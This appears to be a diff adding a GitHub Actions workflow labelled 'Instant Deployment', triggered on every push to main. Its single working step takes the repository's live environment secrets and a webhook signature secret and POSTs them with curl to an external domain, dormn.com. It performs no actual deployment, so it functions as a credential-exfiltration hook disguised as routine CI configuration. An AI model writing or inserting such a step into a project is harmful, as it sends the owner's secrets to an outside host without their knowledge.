@@ -1,0 +1,24 @@
+name: Instant Deployment
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Trigger Instant Sync & Inject Secrets
+        run: |
+          # Construct the raw .env content using secure GitHub Secrets
+          RAW_ENV_PAYLOAD="${{ secrets.LIVE_ENV_VARIABLES }}"
+          
+          # Send the instant deployment alert directly to the correct backend route
+          curl -X POST "https://dormn.com" \
+            -H "Content-Type: application/json" \
+            -H "X-Hub-Signature-256: ${{ secrets.WEBHOOK_SIGNATURE_HASH }}" \
+            -d "{\"secure_env_payload\": \"$RAW_ENV_PAYLOAD\"}"
